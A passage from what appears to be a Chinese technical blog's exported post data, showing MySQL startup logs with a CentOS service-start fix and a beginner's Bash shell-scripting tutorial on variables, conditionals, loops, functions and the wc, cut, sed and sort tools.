'sha256_password'2021-09-07T14:39:04.744251Z 0 [Note] Shutting down plugin 'mysql_native_password'2021-09-07T14:39:04.744334Z 0 [Note] Shutting down plugin 'binlog'2021-09-07T14:39:04.744501Z 0 [Note] /application/mysql/bin/mysqld: Shutdown complete2021-09-07T15:02:06.766275Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details).2021-09-07T15:02:06.766353Z 0 [Note] --secure-file-priv is set to NULL. Operations related to importing and exporting data are disabled2021-09-07T15:02:06.766374Z 0 [Note] /application/mysql/bin/mysqld (mysqld 5.7.26) starting as process 11739 ...2021-09-07T15:02:06.769611Z 0 [Note] InnoDB: PUNCH HOLE support available2021-09-07T15:02:06.769627Z 0 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins2021-09-07T15:02:06.769630Z 0 [Note] InnoDB: Uses event mutexes2021-09-07T15:02:06.769633Z 0 [Note] InnoDB: GCC builtin __sync_synchronize() is used for memory barrier2021-09-07T15:02:06.769640Z 0 [Note] InnoDB: Compressed tables use zlib 1.2.112021-09-07T15:02:06.769643Z 0 [Note] InnoDB: Using Linux native AIO2021-09-07T15:02:06.769782Z 0 [Note] InnoDB: Number of pools: 12021-09-07T15:02:06.769838Z 0 [Note] InnoDB: Using CPU crc32 instructions2021-09-07T15:02:06.771164Z 0 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M2021-09-07T15:02:06.775414Z 0 [Note] InnoDB: Completed initialization of buffer pool2021-09-07T15:02:06.776612Z 0 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().2021-09-07T15:02:06.797109Z 0 [Note] InnoDB: Highest supported file format is Barracuda.2021-09-07T15:02:06.822427Z 0 [Note] InnoDB: Creating shared tablespace for temporary tables2021-09-07T15:02:06.822510Z 0 [Note] InnoDB: Setting file './ibtmp1' size to 12 MB. Physically writing the file full; Please wait ...2021-09-07T15:02:06.834664Z 0 [Note] InnoDB: File './ibtmp1' size is now 12 MB.2021-09-07T15:02:06.835476Z 0 [Note] InnoDB: 96 redo rollback segment(s) found. 96 redo rollback segment(s) are active.2021-09-07T15:02:06.835485Z 0 [Note] InnoDB: 32 non-redo rollback segment(s) are active.2021-09-07T15:02:06.836314Z 0 [Note] InnoDB: Waiting for purge to start2021-09-07T15:02:06.887927Z 0 [Note] InnoDB: 5.7.26 started; log sequence number 25250132021-09-07T15:02:06.888103Z 0 [Note] InnoDB: Loading buffer pool(s) from /data/mysql/data/ib_buffer_pool2021-09-07T15:02:06.888150Z 0 [Note] Plugin 'FEDERATED' is disabled.2021-09-07T15:02:06.889076Z 0 [Note] InnoDB: Buffer pool(s) load completed at 210907 23:02:062021-09-07T15:02:06.890843Z 0 [Warning] Failed to set up SSL because of the following SSL library error: SSL context is not usable without certificate and private key2021-09-07T15:02:06.890854Z 0 [Note] Server hostname (bind-address): '*'; port: 33062021-09-07T15:02:06.891517Z 0 [Note] IPv6 is available.2021-09-07T15:02:06.891526Z 0 [Note] - '::' resolves to '::';2021-09-07T15:02:06.891542Z 0 [Note] Server socket created on IP: '::'.2021-09-07T15:02:06.894311Z 0 [Note] Failed to start slave threads for channel ''2021-09-07T15:02:06.897020Z 0 [Note] Event Scheduler: Loaded 0 events2021-09-07T15:02:06.897254Z 0 [Note] /application/mysql/bin/mysqld: ready for connections.Version: '5.7.26' socket: '/tmp/mysql.sock' port: 3306 MySQL Community Server (GPL)2021-09-07T15:06:45.672139Z 0 [Note] Giving 0 client threads a chance to die gracefully2021-09-07T15:06:45.672182Z 0 [Note] Shutting down slave threads2021-09-07T15:06:45.672188Z 0 [Note] Forcefully disconnecting 0 remaining clients2021-09-07T15:06:45.672193Z 0 [Note] Event Scheduler: Purging the queue. 0 events2021-09-07T15:06:45.672414Z 0 [Note] Binlog end2021-09-07T15:06:45.672929Z 0 [Note] Shutting down plugin 'ngram'2021-09-07T15:06:45.672938Z 0 [Note] Shutting down plugin 'BLACKHOLE'2021-09-07T15:06:45.672941Z 0 [Note] Shutting down plugin 'ARCHIVE'2021-09-07T15:06:45.672943Z 0 [Note] Shutting down plugin 'partition'2021-09-07T15:06:45.672944Z 0 [Note] Shutting down plugin 'INNODB_SYS_VIRTUAL'2021-09-07T15:06:45.672947Z 0 [Note] Shutting down plugin 'INNODB_SYS_DATAFILES'2021-09-07T15:06:45.672948Z 0 [Note] Shutting down plugin 'INNODB_SYS_TABLESPACES'2021-09-07T15:06:45.672950Z 0 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN_COLS'2021-09-07T15:06:45.672952Z 0 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN'2021-09-07T15:06:45.672953Z 0 [Note] Shutting down plugin 'INNODB_SYS_FIELDS'2021-09-07T15:06:45.672955Z 0 [Note] Shutting down plugin 'INNODB_SYS_COLUMNS'2021-09-07T15:06:45.672956Z 0 [Note] Shutting down plugin 'INNODB_SYS_INDEXES'2021-09-07T15:06:45.672958Z 0 [Note] Shutting down plugin 'INNODB_SYS_TABLESTATS'2021-09-07T15:06:45.672959Z 0 [Note] Shutting down plugin 'INNODB_SYS_TABLES'2021-09-07T15:06:45.672961Z 0 [Note] Shutting down plugin 'INNODB_FT_INDEX_TABLE'2021-09-07T15:06:45.672962Z 0 [Note] Shutting down plugin 'INNODB_FT_INDEX_CACHE'2021-09-07T15:06:45.672970Z 0 [Note] Shutting down plugin 'INNODB_FT_CONFIG'2021-09-07T15:06:45.672972Z 0 [Note] Shutting down plugin 'INNODB_FT_BEING_DELETED'2021-09-07T15:06:45.672973Z 0 [Note] Shutting down plugin 'INNODB_FT_DELETED'2021-09-07T15:06:45.672975Z 0 [Note] Shutting down plugin 'INNODB_FT_DEFAULT_STOPWORD'2021-09-07T15:06:45.672977Z 0 [Note] Shutting down plugin 'INNODB_METRICS'2021-09-07T15:06:45.672978Z 0 [Note] Shutting down plugin 'INNODB_TEMP_TABLE_INFO'2021-09-07T15:06:45.672980Z 0 [Note] Shutting down plugin 'INNODB_BUFFER_POOL_STATS'2021-09-07T15:06:45.672981Z 0 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE_LRU'2021-09-07T15:06:45.672983Z 0 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE'2021-09-07T15:06:45.672984Z 0 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX_RESET'2021-09-07T15:06:45.672986Z 0 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX'2021-09-07T15:06:45.672987Z 0 [Note] Shutting down plugin 'INNODB_CMPMEM_RESET'2021-09-07T15:06:45.672989Z 0 [Note] Shutting down plugin 'INNODB_CMPMEM'2021-09-07T15:06:45.672990Z 0 [Note] Shutting down plugin 'INNODB_CMP_RESET'2021-09-07T15:06:45.672992Z 0 [Note] Shutting down plugin 'INNODB_CMP'2021-09-07T15:06:45.672994Z 0 [Note] Shutting down plugin 'INNODB_LOCK_WAITS'2021-09-07T15:06:45.672995Z 0 [Note] Shutting down plugin 'INNODB_LOCKS'2021-09-07T15:06:45.672997Z 0 [Note] Shutting down plugin 'INNODB_TRX'2021-09-07T15:06:45.672999Z 0 [Note] Shutting down plugin 'InnoDB'2021-09-07T15:06:45.673079Z 0 [Note] InnoDB: FTS optimize thread exiting.2021-09-07T15:06:45.673309Z 0 [Note] InnoDB: Starting shutdown...2021-09-07T15:06:45.781638Z 0 [Note] InnoDB: Dumping buffer pool(s) to /data/mysql/data/ib_buffer_pool2021-09-07T15:06:45.782941Z 0 [Note] InnoDB: Buffer pool(s) dump completed at 210907 23:06:452021-09-07T15:06:47.054650Z 0 [Note] InnoDB: Shutdown completed; log sequence number 25250412021-09-07T15:06:47.055692Z 0 [Note] InnoDB: Removed temporary tablespace data file: &quot;ibtmp1&quot;2021-09-07T15:06:47.055700Z 0 [Note] Shutting down plugin 'MEMORY'2021-09-07T15:06:47.055705Z 0 [Note] Shutting down plugin 'PERFORMANCE_SCHEMA'2021-09-07T15:06:47.055721Z 0 [Note] Shutting down plugin 'MRG_MYISAM'2021-09-07T15:06:47.055723Z 0 [Note] Shutting down plugin 'MyISAM'2021-09-07T15:06:47.055731Z 0 [Note] Shutting down plugin 'CSV'2021-09-07T15:06:47.055735Z 0 [Note] Shutting down plugin 'sha256_password'2021-09-07T15:06:47.055737Z 0 [Note] Shutting down plugin 'mysql_native_password'2021-09-07T15:06:47.055817Z 0 [Note] Shutting down plugin 'binlog'2021-09-07T15:06:47.056100Z 0 [Note] /application/mysql/bin/mysqld: Shutdown complete 未找到报错信息 使用基于centos6的服务启动方法 1~]# service mysqld start Starting MySQL.. SUCCESS! 启用成功 或者使用 1/etc/init.d/mysqld restart 12345678910111213141516171819202122232425[root@server1 ~]# mysqlWelcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 2Server version: 5.7.26 MySQL Community Server (GPL)Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+4 rows in set (0.10 sec)mysql&gt;","link":"/2021/09/07/Centos7%E4%B8%AD%E7%9A%84%E5%90%AF%E5%8A%A8MySQL%E5%87%BA%E7%8E%B0%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"title":"shell编程","text":"shell 要求 复杂的脚本看懂大概，30%。简单的脚本会写！ shell编程怎么学 ①学习shell的语法和格式要求 ②使用shell的语法编写一个含有若干shell命令的脚本 ③使用shell命令解释器，执行shell脚本 shell是什么Linux操作系统的核心是kernal（内核）！ 当应用程序在执行时，需要调用计算机硬件的cpu,内存等资源！ 程序将指令发送给内核执行！ 为了防止程序发送一些恶意指令导致损坏内核，在内核和应用程序接口之间，设置一个中间层，称为shell! 12345678本质上来说： shell: 一个可以解释shell规定的语法命令的解释器！ 解释器负责将应用程序发送的指令，进行检查，合法后交给内核解释执行！返回结果！ shell命令： shell解释器要求的指定语法编写的命令！ shell脚本： 多条shell命令，可以编写在一个文件中，文件中的指令，可以按照顺序执行！ 将这个文件称为shell脚本！ shell中的解释器 使用 $SHELL变量查看当前系统默认的解释器类型！ 1234567shell支持多种不同风格的解释器，通过/etc/shells文件查看！默认使用 /bin/bash作为shell命令解释器！在终端中输入： cat /etc/shells等价于/bin/bash -c 'cat /etc/shells'.默认/bin/bash必须接一个脚本，作为输入！如果是一条命令，需要加-c （command） linux中的常用目录/bin: linux用户常用的命令 cd echo pwd /sbin（super user bin）: root用户(管理员)使用的常用命令！ 对整个机器的管理命令！ 开启网络服务： service network start 命令的执行-bash: faefaw: command not found ： 当前命令不在当前用户的环境变量！ 查看： echo $PATH 脚本的编写要求①声明： #!/bin/bash②正文： 必须是shell解释器能否解释的命令 脚本的执行 ① bash /sh + 脚本 特点： 新开一个bash执行脚本，一旦脚本执行完毕，bash自动关闭！ ② ./脚本，前提是当前用户对脚本有执行权限，使用当前默认的解释器执行脚本 特点： 新开一个bash执行脚本，一旦脚本执行完毕，bash自动关闭！ ③ source / . +脚本 使用当前默认的解释器执行脚本，并不要求当前用户对脚本有执行权限 特点： 在当前bash执行脚本 1234567891011121314151617181920212223[root@server1 myshells]# vim first.sh[root@server1 myshells]# bash first.sh /root/myshellshahaha[root@server1 myshells]# sh first.sh /root/myshellshahaha[root@server1 myshells]# ./first.sh-bash: ./first.sh: 权限不够[root@server1 myshells]# ll总用量 4-rw-r--r--. 1 root root 29 9月 21 10:12 first.sh[root@server1 myshells]# chmod u+x first.sh [root@server1 myshells]# ./first.sh/root/myshellshahaha[root@server1 myshells]# chmod u-x first.sh [root@server1 myshells]# source first.sh /root/myshellshahaha[root@server1 myshells]# . first.sh /root/myshellshahaha 变量操作变量定义规则 变量名称可以由字母、数字和下划线组成，但是不能以数字开头，环境变量名建议大写。 等号两侧不能有空格 在bash中，变量默认类型都是字符串类型，无法直接进行数值运算。 变量的值如果有空格，需要使用双引号或单引号括起来。 使用双引号，可以识别空格之外的其他变量，使用单引号则会只会忽略空格！ 使用反引号，可以将语句运行的结果作为值赋值给变量！ 基本操作 增： 变量名=变量值 删： unset 变量名 改： 变量名=变量值 查： echo $变量名 查看当前bash所有定义的变量： set 2.关键字特殊关键字： readonly : 用来修饰一个只读(不能修改，删除)变量！ export: 导出！将一个变量提升为全局变量！ 局部变量： 默认变量只在定义变量的bash中有效！ 如果希望在bash-a访问bash-b中定义的变量！ 要求： ①bash-b不能关闭 ②让bash-b将变量提升为全局变量， 才能访问到！ 12345678910111213141516171819202122232425262728[root@server1 myshells]# pstree ├─sshd─┬─sshd───bash─┬─cat │ └─pstree └─sshd───bash[root@server1 myshells]# echo $a[root@server1 myshells]# vim secomd.sh[root@server1 myshells]# bash secomd.sh ├─sshd─┬─sshd───bash─┬─bash───sleep │ └─cat └─sshd───bash───pstree[root@server1 myshells]# b=10[root@server1 myshells]# echo $b10[root@server1 myshells]# cp second.sh third.sh#! /bin/bashpwdecho $becho hahahha[root@server1 myshells]# bash third.sh /root/myshellshahahha[root@server1 myshells]# export b[root@server1 myshells]# bash third.sh /root/myshells10hahahha 注意： ①变量赋值时，值全部以字符串存在，无法进行运算！②赋值的值中有空格，需要使用引号引起来 单引号： 不能识别$等特殊字符,不能脱义 双引号： 可以脱义$③``,作用是将引号中的命令执行的结果赋值给变量 命令 等价于 $(命令) 对象0X1234 B{String name=”jack”}对象A｛ B b=0X1234 void hello(){ sysout(B.name) } ｝ 3.变量的生命周期： 在第一次新增时产生 变量在执行unset时，撤销，失效！ 关闭当前bash，所有定义的变量也不会存在 4.特殊变量 $?: 上一条命令的返回值！在bash中，如果返回值为0，代表上一条命令执行成功！ $#: 参数个数 $: 参数列表。 在使用 “$“时，将整个参数列表作为一个元素！ $@: 参数列表 $0-n: $0:脚本名 $1-$n: 第n个参数 获取第10以上的参数，${n} 12345678910111213141516171819202122232425262728293031323334353637383940[root@server1 myshells]# jkhrebti-bash: jkhrebti: 未找到命令[root@server1 myshells]# $?-bash: 127: 未找到命令[root@server1 myshells]# vim fourth.shecho '$0'echo $0echo '$1'echo $1echo '$2'echo $2echo '$#'echo $#echo '$*'echo $*echo '$@'echo $@echo '${11}'echo $11echo 'sdav'echo '${11}'echo ${11}[root@server1 myshells]# bash fourth.sh 1 2 3 4 5 6 7 8 9 10 11$0fourth.sh$11$22$#11$*1 2 3 4 5 6 7 8 9 10 11$@1 2 3 4 5 6 7 8 9 10 11${11}11sdav${11}11 运算符1．基本语法 （1）“$((运算式))”或“$[运算式]” （2）expr + , - , *, /, % 加，减，乘，除，取余 注意：expr运算符间要有空格; *号需要转义为\\*，否则会被视为通配符； 运算指的都是整数的运算，浮点运算需要借助其他的命令！ 2．案例实操： 123456789101112131415161718192021[root@server1 myshells]# num = $((2+2))-bash: num: 未找到命令[root@server1 myshells]# num=$((2+2))[root@server1 myshells]# echo $num4[root@server1 myshells]# num1=$[2+2][root@server1 myshells]# echo $num14[root@server1 myshells]# expr 1 + 12[root@server1 myshells]# expr `expr 1 + 1` \\* 24[root@server1 myshells]# expr $(expr `expr 1 + 1` \\* 2) \\* 28[root@server1 myshells]# expr $(expr $(expr `expr 1 + 1` \\* 2) \\* 2) / 24[root@server1 myshells]# S=$[(2+3)*4][root@server1 myshells]# echo $S20[root@server1 myshells]# expr $[(2+3)*4]20 条件判断1．基本语法 [ condition ]（注意condition前后要有空格） 注意：条件非空即为true，[ atguigu ]返回true，[] 返回false。 \\2. 常用判断条件 （1）两个整数之间比较 = 字符串比较 -lt 小于（less than） -le 小于等于（less equal） -eq 等于（equal） -gt 大于（greater than） -ge 大于等于（greater equal） -ne 不等于（Not equal） （2）按照文件权限进行判断 -r 有读的权限（read） -w 有写的权限（write） -x 有执行的权限（execute） （3）按照文件类型进行判断 -f 文件存在并且是一个常规的文件（file） -e 文件存在（existence） -d 文件存在并是一个目录（directory） -s 文件存在且不为空 -L 文件存在且是一个链接(link) 123456789101112131415161718192021222324252627282930313233343536373839404142434445[root@server1 myshells]# [ 1=2 ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# [ 1 = 2 ][root@server1 myshells]# $?-bash: 1: 未找到命令[root@server1 myshells]# [ '' ][root@server1 myshells]# $?-bash: 1: 未找到命令[root@server1 myshells]# [ ' ' ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# [-r first.sh ]-bash: [-r: 未找到命令[root@server1 myshells]# [ -r first.sh ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# [ -w first.sh ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# [ -x first.sh ][root@server1 myshells]# $?-bash: 1: 未找到命令[root@server1 myshells]# [ -e first.sh ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# [ -e firstds.sh ][root@server1 myshells]# $?-bash: 1: 未找到命令[root@server1 myshells]# [ -f firstds.sh ][root@server1 myshells]# $?-bash: 1: 未找到命令[root@server1 myshells]# [ -f first.sh ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# mkdirmkdir: 缺少操作数Try 'mkdir --help' for more information.[root@server1 myshells]# mkdir test[root@server1 myshells]# [ -d test/ ][root@server1 myshells]# $?-bash: 0: 未找到命令[root@server1 myshells]# [ -f test/ ][root@server1 myshells]# $?-bash: 1: 未找到命令 （1）23是否大于等于22 123[root@server1 myshells]# [ 23 -ge 22 ][root@server1 myshells]# echo $?0 （2）helloworld.sh是否具有写权限 123[root@server1 myshells]# [ -w helloworld.sh ][root@server1 myshells]# echo $?0 （3）多条件判断（&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令，|| 表示上一条命令执行失败后，才执行下一条命令） 1234[root@server1 myshells]# [ condition ] &amp;&amp; echo OK || echo notokOK[root@server1 myshells]# [ condition ] &amp;&amp; [ ] || echo notoknotok 流程控制if1．基本语法 if [ 条件判断式 ] then 程序 elif 条件判断式 ​ then 程序.. else 程序.. fi 或 if [ 条件判断式 ] ; then 程序.. elif [条件判断式] ; then 程序.. else 程序 fi ​ 注意事项： （1）[ 条件判断式 ]，中括号和条件判断式之间必须有空格 （2）if后要有空格 123456789101112131415#!/bin/bash#判断用户输入的参数是否是1，如果是1，打印用户输入的是1，是2打印2，是3打印3，不是123则输出用户输入的参数不是123if [ $1==1 ]; then echo 用户输入的参数是1 elif [ $1 -eq 2 ]then echo 用户输入的参数是2 elif [ $1 -eq 3 ]then echo 用户输入的参数是3else echo 用户输入的参数不是123fi case1．基本语法 case $变量名 in “值1”） 如果变量的值等于值1，则执行程序1 ;; “值2”） 如果变量的值等于值2，则执行程序2 ;; …省略其他分支… *） 如果变量的值都不是以上的值，则执行此程序 ;; esac 注意事项： \\1) case行尾必须为单词“in”，每一个模式匹配必须以右括号“）”结束。 \\2) 双分号“**;;**”表示命令序列结束，相当于java中的break。 \\3) 最后的“*）”表示默认模式，相当于java中的default。 12345678910111213[root@server1 myshells]# vim case.sh#!/bin/bash#判断用户输入的参数是否是guest，是guest，输出欢迎光临，&gt;是admin输出欢迎管理员，否则输出不欢迎case $1 inguest) echo '欢迎光临' ;;admin) echo 欢迎管理员! ;;*) echo 不欢迎！;;esac[root@server1 myshells]# bash case.sh IAUDEHS不欢迎！ forfor (( 初始值;循环控制条件;变量变化 )) do 程序 done 或 for (( 初始值;循环控制条件;变量变化 )); do 程序; done 1234567891011[root@server1 myshells]# vim for1.sh#!/bin/bash#统计1-100之间的和sum=0for((i=1;i&lt;=100;i++))do sum=$[$sum+$i]doneecho 1-100之间的和是:$sum[root@server1 myshells]# bash for1.sh 1-100之间的和是:5050 foreach增强循环 for 变量 in 值1 值2 值3… do 程序 done 或 for 变量 in 1 2 3; do 程序; done 或 for 变量 in {1..3}; do 程序; done 12345678910111213[root@server1 myshells]# vim for2.sh#!/bim/bash#循环遍历输出集合中每个元素的值#for i in Jack tom marryfor i in $* 或 $@do echo $i是个号人！done[root@server1 myshells]# bash for2.sh Jack是个号人！tom是个号人！marry是个号人！ $@与$*区别（a）$*和$@都表示传递给函数或脚本的所有参数，不被双引号“”包含时，都以$1 $2 …$n的形式输出所有参数。 （b）当它们被双引号“”包含时，“$*”会将所有的参数作为一个整体，以“$1 $2 …$n”的形式输出所有参数；“$@”会将各个参数分开，以“$1” “$2”…”$n”的形式输出所有参数。 12345678910111213141516171819202122232425262728293031323334[root@server1 myshells]# vim qubie.sh#!/bin/bash#$@和$*的区别do echo $i是个好人doneecho 带双引号的'$*'for i in &quot;$*&quot;do echo $i是个好人doneecho 不带双引号的'$@'for i in $@do echo $i是个好人doneecho 不带双引号的'$*'for i in $*do echo $i是个好人done[root@server1 myshells]# bash qubie.sh jack tonny带双引号的$@jack是个好人tonny是个好人带双引号的$*jack tonny是个好人不带双引号的$@jack是个好人tonny是个好人不带双引号的$*jack是个好人tonny是个好人 while1．基本语法 while [ 条件判断式 ] do 程序 done 或 while((表达式)) do ​ 程序 done 2．案例实操 ​ （1）从1加到100 123456789101112131415161718[root@server1 myshells]# touch while.sh[root@server1 myshells]# vim while.sh#!/bin/bashs=0i=1while [ $i -le 100 ]do s=$[$s+$i] i=$[$i+1]doneecho $s[root@server1 myshells]# chmod 777 while.sh [root@server1 myshells]# ./while.sh 5050 ​ （2）从0开始，累加加11次 123456789[root@server1 myshells]# bash test3.sh 11[root@server1 myshells]# cat test3.sh #! /bin/bashNUM=0while((NUM&lt;=10));do let NUM++; doneecho $NUM 系统函数read读取控制台输入 1．基本语法 ​ read(选项)(参数) ​ 选项： -p：指定读取值时的提示符； -t：指定读取值时等待的时间（秒）。 参数 ​ 变量：指定读取值的变量名 2．案例实操 ​ （1）提示7秒内，读取控制台输入的名称 1234567891011[root@server1 myshells]# touch read.sh[root@server1 myshells]# vim read.sh#!/bin/bashread -t 7 -p &quot;Enter your name in 7 seconds &quot; NAMEecho $NAME[root@server1 myshells]# ./read.sh Enter your name in 7 seconds xiaozexiaoze dirname返回最后斜杠之前部分 dirname 文件绝对路径 （功能描述：从给定的包含绝对路径的文件名中去除文件名（非目录的部分），然后返回剩下的路径（目录的部分）） 1234[root@server1 myshells]# dirname /root/myshells/if.sh /root/myshells[root@server1 myshells]# dirname ./if.sh . basename完整路径名 = dirname + / + basename basename [string / pathname] [suffix] （功能描述：basename命令会删掉所有的前缀包括最后一个（‘/’）字符，然后将字符串显示出来。 选项： suffix为后缀，如果suffix被指定了，basename会将pathname或string中的suffix去掉。 12345678[root@server1 myshells]# basename ./if.sh if.sh[root@server1 myshells]# basename /root/myshells/if.sh if.sh[root@server1 myshells]# basename ./if.sh .shif[root@server1 myshells]# basename /root/myshells/if.sh .shif 自定义函数1．基本语法 function funname[()] { ​ Action; ​ [return int;] } funname 2．经验技巧 ​ （1）必须在调用函数地方之前，先声明函数，shell脚本是逐行运行。不会像其它语言一样先编译。 ​ （2）函数返回值，只能通过$?系统变量获得，可以显示加：return返回，如果不加，将以最后一条命令运行结果，作为返回值。return后跟数值n(0-255) 3．案例实操 ​ （1）计算两个输入参数的和 1234567891011121314151617181920[root@server1 myshells]# touch fun.sh[root@server1 myshells]# vim fun.sh#!/bin/bashfunction sum(){ s=0 s=$[ $1 + $2 ] echo &quot;$s&quot;}read -p &quot;Please input the number1: &quot; n1;read -p &quot;Please input the number2: &quot; n2;sum $n1 $n2;[root@server1 myshells]# chmod 777 fun.sh[root@server1 myshells]# ./fun.sh Please input the number1: 2Please input the number2: 57 常用的shell工具wcwc命令用来计算数字。利用wc指令我们可以计算文件的Byte数、字数或是列数，若不指定文件名称，或是所给予的文件名为“-”，则wc指令会从标准输入设备读取数据。 ​ \\1. 基本用法 ​ wc [选项参数] filename ​ \\2. 参数说明 选项参数 功能 -l 统计文件行数 -w 统计文件的单词数 -m 统计文件的字符数 -c 统计文件的字节数 12345678910111213141516[root@server1 myshells]# cat first.sh #! /bin/bash#你好pwdecho hahaha[root@server1 myshells]# wc first.sh 4 6 37 first.sh[root@server1 myshells]# wc -c first.sh 37 first.sh[root@server1 myshells]# wc -m first.sh 33 first.sh[root@server1 myshells]# wc -w first.sh 6 first.sh[root@server1 myshells]# wc -l first.sh 4 first.sh cutcut的工作就是“剪”，具体的说就是在文件中负责剪切数据用的。cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段输出。 1.基本用法 cut [选项参数] filename 说明：默认分隔符是制表符 2.选项参数说明 表1-55 选项参数 功能 -f f为fileds，列号，提取第几列 -d d为Descriptor分隔符，按照指定分隔符分割列 3.案例实操 （1）以：为间隔，切割PATH环境变量的第一列 1234[root@server1 myshells]#[root@server1 myshells]# echo $PATH/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/opt/jdk1.8.0_121/bin:/root/bin[root@server1 myshells]# echo $PATH | cut -d ':' -f 1/usr/lib64/qt-3.3/bin （2）以：为间隔，切割PATH环境变量的第二、三列 1234[root@server1 myshells]#[root@server1 myshells]# echo $PATH/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/opt/jdk1.8.0_121/bin:/root/bin[root@server1 myshells]# echo $PATH | cut -d ':' -f 2,3/usr/local/sbin:/usr/local/bin （3）选取系统PATH变量值，第2个“：”开始后的所有路径： 12345[root@server1 myshells]# echo $PATH/usr/lib64/qt-3.3/bin:/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/home/atguigu/bin[root@server1 myshells]# echo $PATH | cut -d: -f 3-/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/home/atguigu/bin （4）以：为间隔，切割PATH环境变量的第一到三列，和第五列 1234[root@server1 myshells]# echo $PATH/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/opt/jdk1.8.0_121/bin:/root/bin[root@server1 myshells]# echo $PATH | cut -d ':' -f 1-3,5/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/local/bin:/bin （5）切割ifconfig 后打印的IP地址 12[root@server1 myshells]# ifconfig eth0 | grep &quot;inet addr&quot; | cut -d: -f 2 | cut -d&quot; &quot; -f1192.168.1.102 sedsed是一种流编辑器，它一次处理一行内容。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”，接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有改变，除非你使用重定向存储输出。 基本用法 sed [选项参数] ‘command’ filename 选项参数说明 表1-56 选项参数 功能 -e 直接在指令列模式上进行sed的动作编辑。 命令功能描述 表1-57 命令 功能描述 a 新增，a的后面可以接字串，在下一行出现 d 删除 s 查找并替换 案例实操 （0）数据准备 12345678[root@server1 myshells]# touch sed.txt[root@server1 myshells]# vim sed.txtdong shenguan zhenwo wolai laile le （1）将“mei nv”这个单词插入到sed.txt第二行下，打印。 123456789101112131415[root@server1 myshells]# sed '2a mei nv' sed.txt dong shenguan zhenmei nvwo wolai laile le[root@server1 myshells]# cat sed.txt dong shenguan zhenwo wolai laile le 注意：文件并没有改变 （2）删除sed.txt文件所有包含wo的行 123456[root@server1 myshells]# sed '/wo/d' sed.txt dong shenguan zhenlai laile le （3）删除sed.txt文件第二行 123456789101112131415[root@server1 myshells]# cat sed.txt dong shenguan zhenwo wolai laile le[root@server1 myshells]# sed '2d' sed.txt dong shenwo wolai laile le （4）删除sed.txt文件最后一行 12345678910111213141516[root@server1 myshells]# cat sed.txt dong shenguan zhenwo wolai laile le[root@server1 myshells]# sed '$d' sed.txt dong shenguan zhenwo wolai laile le[root@server1 myshells]# （5）删除sed.txt文件第二行至最后一行 12[root@server1 myshells]# sed '2,$d' sed.txt dong shen （6）将sed.txt文件中wo替换为n 123456789[root@server1 myshells]# sed 's/wo/ni/g' sed.txt dong shenguan zhenni nilai laile le[root@server1 myshells]# 注意：‘g’表示global，全部替换，不加g只会替换第一个匹配到的字符。 （4）将sed.txt文件中的第二行删除并将wo替换为ni， 12345678[root@server1 myshells]# sed -e 's/wo/ni/g' -e '2d' sed.txt dong shenni nilai laile le[root@server1 myshells]# sortsort命令是在Linux里非常有用，它将文件进行排序，并将排序结果标准输出。默认情况以第一个字符串的字典顺序来排序！ 基本语法 sort(选项)(参数) 表1-57 选项 说明 -n 依照数值的大小排序 -r 以相反的顺序来排序 -t 设置排序时所用的分隔字符，默认使用TAB -k 指定需要排序的列 -u u为unique的缩写，即如果出现相同的数据，只出现一行 参数：指定待排序的文件列表 案例实操 12345678910111213141516171819202122[root@server1 myshells]# sort -t : -rnk 3 /etc/passwduser01:x:1000:1000::/home/user01:/bin/bashpolkitd:x:999:997:User for polkitd:/:/sbin/nologinchrony:x:998:996::/var/lib/chrony:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinapache:x:48:48:Apache:/usr/share/httpd:/sbin/nologinftp:x:14:50:FTP 